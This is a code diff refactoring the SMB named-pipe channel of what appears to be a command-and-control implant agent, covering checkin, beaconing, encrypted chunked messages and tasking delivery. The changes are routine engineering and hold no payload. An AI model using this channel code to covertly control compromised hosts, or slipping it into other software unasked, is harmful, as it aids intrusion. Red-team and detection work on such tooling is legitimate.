@@ -3,8 +3,6 @@ using Workflow.Utilities;
 using System.Text.Json;
 using Workflow.Models;
 using Workflow.Channels.Smb;
-using System.Collections.Concurrent;
-using System.Text;
 using System.IO.Pipes;
 using System.Security.AccessControl;
 using System.Security.Principal;
@@ -24,26 +22,21 @@ namespace Workflow.Channels
         private int chunkSize;
         private int connectionTimeoutMs;
         private int checkinTimeoutMs;
-        private ConcurrentDictionary<string, StringBuilder> partialMessages =
-            new ConcurrentDictionary<string, StringBuilder>();
-        private ConcurrentDictionary<string, int> expectedSequence =
-            new ConcurrentDictionary<string, int>();
+        private ChunkedMessageAssembler assembler = new();
         private PipeServer<SmbMessage> serverPipe { get; set; }
-        private ManualResetEventSlim checkinAvailable =
-            new ManualResetEventSlim(false);
+        private TaskCompletionSource<CheckinResponse>
+            checkinTcs = new();
         private ManualResetEventSlim clientConnected =
             new ManualResetEventSlim(false);
-        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
-        private CheckinResponse cir;
+        public event EventHandler<TaskingReceivedArgs>?
+            SetTaskingReceived;
 
         private bool checkedin = false;
-        private volatile bool connected = false;
         private int currentAttempt = 0;
         private int maxAttempts = 10;
-        private readonly object disconnectLock = new object();
         private bool disposed = false;
-        private CancellationTokenSource cancellationTokenSource { get; set; } =
-            new CancellationTokenSource();
+        private CancellationTokenSource cancellationTokenSource
+            { get; set; } = new CancellationTokenSource();
 
         public SmbProfile(
             IServiceConfig config,
@@ -58,7 +51,8 @@ namespace Workflow.Channels
 
             var opts = JsonSerializer.Deserialize(
                 ChannelConfig.Decode(),
-                SmbChannelOptionsJsonContext.Default.SmbChannelOptions);
+                SmbChannelOptionsJsonContext.Default
+                    .SmbChannelOptions);
 
             this.pipeName = opts.PipeName;
             this.chunkSize = opts.ChunkSize;
@@ -89,47 +83,56 @@ namespace Workflow.Channels
             this.serverPipe.ClientDisconnected +=
                 async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived +=
-                async (sender, args) => await OnMessageReceive(args);
+                async (sender, args) =>
+                    await OnMessageReceive(args);
             this.serverPipe.StartAsync(
                 this.cancellationTokenSource.Token);
             DebugLog.Log("SMB server pipe started");
         }
 
-        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        public async Task<CheckinResponse> Checkin(
+            Checkin checkin)
         {
             DebugLog.Log("SMB sending checkin");
+            this.checkinTcs =
+                new TaskCompletionSource<CheckinResponse>();
             await this.Send(
                 JsonSerializer.Serialize(
-                    checkin, CheckinJsonContext.Default.Checkin));
+                    checkin,
+                    CheckinJsonContext.Default.Checkin));
 
             DebugLog.Log("SMB waiting for checkin response");
-            if (!checkinAvailable.Wait(this.checkinTimeoutMs))
+            var cts = new CancellationTokenSource(
+                this.checkinTimeoutMs);
+            try
+            {
+                var result = await checkinTcs.Task
+                    .WaitAsync(cts.Token);
+                this.checkedin = true;
+                DebugLog.Log("SMB checkin complete");
+                return result;
+            }
+            catch (OperationCanceledException)
             {
                 DebugLog.Log("SMB checkin timed out");
                 throw new TimeoutException(
-                    $"SMB checkin timed out after " +
-                    $"{this.checkinTimeoutMs}ms");
+                    $"SMB checkin timed out after "
+                    + $"{this.checkinTimeoutMs}ms");
             }
-
-            this.checkedin = true;
-            DebugLog.Log("SMB checkin complete");
-            return this.cir;
         }
 
         public async Task StartBeacon()
         {
-            var oldCts = this.cancellationTokenSource;
-            this.cancellationTokenSource = new CancellationTokenSource();
-            oldCts.Dispose();
-
-            while (!cancellationTokenSource.Token.IsCancellationRequested)
+            while (!cancellationTokenSource.Token
+                .IsCancellationRequested)
             {
                 if (!this.messageManager.HasResponses())
                 {
                     try
                     {
                         await Task.Delay(
-                            500, cancellationTokenSource.Token);
+                            500,
+                            cancellationTokenSource.Token);
                     }
                     catch (OperationCanceledException)
                     {
@@ -140,47 +143,54 @@ namespace Workflow.Channels
 
                 try
                 {
-                    DebugLog.Log("SMB beacon sending responses");
+                    DebugLog.Log(
+                        "SMB beacon sending responses");
                     await this.Send(
-                        messageManager.GetAgentResponseString());
+                        messageManager
+                            .GetAgentResponseString());
                     this.currentAttempt = 0;
                 }
                 catch (Exception e)
                 {
                     this.currentAttempt++;
                     DebugLog.Log(
-                        $"SMB beacon send failed: {e.Message}, " +
-                        $"attempt {this.currentAttempt}/{this.maxAttempts}");
+                        $"SMB beacon send failed: "
+                        + $"{e.Message}, attempt "
+                        + $"{this.currentAttempt}/"
+                        + $"{this.maxAttempts}");
                 }
 
                 if (this.currentAttempt >= this.maxAttempts)
                 {
                     DebugLog.Log(
-                        "SMB beacon max attempts reached, cancelling");
+                        "SMB beacon max attempts reached");
                     this.cancellationTokenSource.Cancel();
                 }
             }
         }
 
-        internal async Task<string> Send(string json)
+        internal async Task Send(string json)
         {
-            if (!connected)
+            if (!clientConnected.IsSet)
             {
-                DebugLog.Log("SMB Send waiting for client connection");
-                if (!clientConnected.Wait(this.connectionTimeoutMs))
+                DebugLog.Log(
+                    "SMB Send waiting for client");
+                if (!clientConnected.Wait(
+                        this.connectionTimeoutMs))
                 {
                     throw new TimeoutException(
-                        $"SMB connection timed out after " +
-                        $"{this.connectionTimeoutMs}ms");
+                        $"SMB connection timed out after "
+                        + $"{this.connectionTimeoutMs}ms");
                 }
             }
 
             DebugLog.Log(
-                $"SMB Send ({json.Length} chars before encryption)");
+                $"SMB Send ({json.Length} chars)");
             json = this.crypt.Encrypt(json);
             List<string> parts =
                 json.SplitByLength(this.chunkSize).ToList();
-            DebugLog.Log($"SMB Send chunking into {parts.Count} parts");
+            DebugLog.Log(
+                $"SMB Send chunking into {parts.Count} parts");
 
             string messageGuid = Guid.NewGuid().ToString();
             for (int i = 0; i < parts.Count; i++)
@@ -196,8 +206,6 @@ namespace Workflow.Channels
                 };
                 await this.serverPipe.WriteAsync(sm);
             }
-
-            return String.Empty;
         }
 
         public bool StopBeacon()
@@ -206,18 +214,31 @@ namespace Workflow.Channels
             return true;
         }
 
-        private async Task SendSuccess()
+        private async Task SendMessageComplete()
         {
-            SmbMessage sm = new SmbMessage()
+            var sm = new SmbMessage
             {
                 guid = Guid.NewGuid().ToString(),
-                message_type = SmbMessageType.Success,
+                message_type = SmbMessageType.MessageComplete,
                 final = true,
-                delegate_message = String.Empty,
+                delegate_message = string.Empty,
                 agent_guid = agentConfig.uuid,
                 sequence = 0,
             };
+            await this.serverPipe.WriteAsync(sm);
+        }
 
+        private async Task SendError(string errorMessage)
+        {
+            var sm = new SmbMessage
+            {
+                guid = Guid.NewGuid().ToString(),
+                message_type = SmbMessageType.Error,
+                final = true,
+                delegate_message = errorMessage,
+                agent_guid = agentConfig.uuid,
+                sequence = 0,
+            };
             await this.serverPipe.WriteAsync(sm);
         }
 
@@ -227,129 +248,114 @@ namespace Workflow.Channels
             try
             {
                 DebugLog.Log(
-                    $"SMB message received, type: " +
-                    $"{args.Message.message_type}");
-                if (args.Message.message_type == SmbMessageType.Success)
+                    $"SMB message received, type: "
+                    + args.Message.message_type);
+
+                switch (args.Message.message_type)
                 {
+                    case SmbMessageType.ConnectionReady:
+                    case SmbMessageType.MessageComplete:
+                    case SmbMessageType.Error:
+                        return;
+
+                    case SmbMessageType.Chunked:
+                        break;
+
+                    default:
+                        return;
+                }
+
+                var result = assembler.AddChunk(
+                    args.Message.guid,
+                    args.Message.sequence,
+                    args.Message.delegate_message,
+                    args.Message.final,
+                    out string? fullMessage);
+
+                DebugLog.Log(
+                    $"SMB chunk result: {result}, "
+                    + $"guid: {args.Message.guid}, "
+                    + $"seq: {args.Message.sequence}");
+
+                if (result
+                    == ChunkedMessageAssembler.Result
+                        .OutOfOrder)
+                {
+                    DebugLog.Log(
+                        "SMB chunk out of order, discarding");
+                    await this.SendError(
+                        "Out of order chunk");
                     return;
                 }
 
-                string guid = args.Message.guid;
-
-                lock (disconnectLock)
+                if (result
+                    == ChunkedMessageAssembler.Result.Complete
+                    && fullMessage != null)
                 {
-                    this.partialMessages.TryAdd(
-                        guid, new StringBuilder());
-                    int expected =
-                        this.expectedSequence.GetOrAdd(guid, 0);
-
-                    if (args.Message.sequence != expected)
-                    {
-                        DebugLog.Log(
-                            $"SMB chunk out of order for {guid}: " +
-                            $"expected {expected}, " +
-                            $"got {args.Message.sequence}. " +
-                            $"Discarding message.");
-                        this.partialMessages.TryRemove(guid, out _);
-                        this.expectedSequence.TryRemove(guid, out _);
-                        return;
-                    }
-
-                    this.expectedSequence[guid] = expected + 1;
-                    this.partialMessages[guid].Append(
-                        args.Message.delegate_message);
+                    await this.OnMessageReceiveComplete(
+                        fullMessage);
+                    await this.SendMessageComplete();
                 }
-
-                DebugLog.Log(
-                    $"SMB partial message tracked for {guid}, " +
-                    $"seq: {args.Message.sequence}, " +
-                    $"final: {args.Message.final}");
-
-                if (args.Message.final)
-                {
-                    DebugLog.Log("SMB message complete, processing");
-                    string fullMessage;
-                    lock (disconnectLock)
-                    {
-                        if (!this.partialMessages.TryRemove(
-                                guid, out var sb))
-                        {
-                            DebugLog.Log(
-                                $"SMB message {guid} was cleared " +
-                                $"during disconnect");
-                            return;
-                        }
-                        this.expectedSequence.TryRemove(guid, out _);
-                        fullMessage = sb.ToString();
-                    }
-                    await this.OnMessageReceiveComplete(fullMessage);
-                }
-
-                await this.SendSuccess();
             }
             catch (Exception e)
             {
                 DebugLog.Log(
-                    $"SMB OnMessageReceive error: {e.Message}");
+                    $"SMB OnMessageReceive error: "
+                    + e.Message);
             }
         }
 
         private async Task OnClientConnection()
         {
             DebugLog.Log("SMB client connected");
-            this.connected = true;
             clientConnected.Set();
-            await this.SendUpdate();
+            var sm = new SmbMessage
+            {
+                guid = Guid.NewGuid().ToString(),
+                message_type = SmbMessageType.ConnectionReady,
+                final = true,
+                delegate_message = string.Empty,
+                agent_guid = this.agentConfig.uuid,
+                sequence = 0,
+            };
+            await this.serverPipe.WriteAsync(sm);
         }
 
-        private async Task OnClientDisconnect()
+        private Task OnClientDisconnect()
         {
             DebugLog.Log("SMB client disconnected");
-            this.connected = false;
             clientConnected.Reset();
-            lock (disconnectLock)
-            {
-                this.partialMessages.Clear();
-                this.expectedSequence.Clear();
-            }
+            assembler.Clear();
+            return Task.CompletedTask;
         }
 
-        private async Task OnMessageReceiveComplete(string message)
+        private async Task OnMessageReceiveComplete(
+            string message)
         {
             if (!checkedin)
             {
-                cir = JsonSerializer.Deserialize(
+                var cir = JsonSerializer.Deserialize(
                     this.crypt.Decrypt(message),
-                    CheckinResponseJsonContext.Default.CheckinResponse);
-                checkinAvailable.Set();
+                    CheckinResponseJsonContext.Default
+                        .CheckinResponse);
+                checkinTcs.TrySetResult(cir);
                 return;
             }
 
-            GetTaskingResponse gtr = JsonSerializer.Deserialize(
-                this.crypt.Decrypt(message),
-                GetTaskingResponseJsonContext.Default
-                    .GetTaskingResponse);
+            GetTaskingResponse gtr =
+                JsonSerializer.Deserialize(
+                    this.crypt.Decrypt(message),
+                    GetTaskingResponseJsonContext.Default
+                        .GetTaskingResponse);
+
             if (gtr == null)
             {
                 return;
             }
-            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+
+            TaskingReceivedArgs tra =
+                new TaskingReceivedArgs(gtr);
             SetTaskingReceived?.Invoke(this, tra);
-        }
-
-        private async Task SendUpdate()
-        {
-            SmbMessage sm = new SmbMessage()
-            {
-                guid = Guid.NewGuid().ToString(),
-                final = true,
-                message_type = SmbMessageType.Success,
-                delegate_message = "",
-                agent_guid = this.agentConfig.uuid,
-                sequence = 0,
-            };
-
-            await this.serverPipe.WriteAsync(sm);
         }
 
         public async ValueTask DisposeAsync()
@@ -359,7 +365,6 @@ namespace Workflow.Channels
 
             cancellationTokenSource.Cancel();
             cancellationTokenSource.Dispose();
-            checkinAvailable.Dispose();
             clientConnected.Dispose();
             if (serverPipe != null)
             {
